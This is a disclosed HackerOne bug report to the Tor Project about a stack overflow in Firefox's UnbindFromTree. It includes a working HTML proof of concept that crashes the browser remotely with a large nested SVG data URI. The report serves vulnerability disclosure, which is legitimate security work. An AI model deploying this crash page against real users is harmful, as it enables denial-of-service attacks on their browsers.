---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '264481'
original_report_id: '264481'
title: Stack overflow in UnbindFromTree (browser can be crashed remotely)
weakness: Stack Overflow
team_handle: torproject
created_at: '2017-08-30T00:34:16.164Z'
disclosed_at: '2017-10-02T07:40:29.690Z'
has_bounty: false
visibility: full
substate: informative
vote_count: 1
tags:
- hackerone
- stack-overflow
---

# Stack overflow in UnbindFromTree (browser can be crashed remotely)

## Metadata

- HackerOne Report ID: 264481
- Weakness: Stack Overflow
- Program: torproject
- Disclosed At: 2017-10-02T07:40:29.690Z
- Has Bounty: No
- Visibility: full
- Substate: informative

## Original Report

I reported this bug to Mozilla approximately [9 months ago](https://bugzilla.mozilla.org/show_bug.cgi?id=1322307) and all versions of Firefox back to at least ESR45 and including current Nightly 57 builds are still vulnerable to this unpatched flaw. I've tested on Fedora 26, Debian 8, Windows 8 and Windows 10. Mozilla declined to award a bounty. 

Code:
```
<html>
<head></head>
<body>
<script>
function done() {
}

var x = '';
for (i=0; i<500000; ++i)
  x += '<a>';
var uri = 'data:image/svg+xml,' + x;
var i = new Image();
i.src = uri;
</script>
</body>
</html>
```

The caveat to this is that if scripts are disabled on the page where this code is located, the Tor browser won't crash. [This link](https://bugzilla.mozilla.org/attachment.cgi?id=8817075) will probably crash your Firefox. A WinDBG stack trace is located [here](https://bugzilla.mozilla.org/attachment.cgi?id=8817117).

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
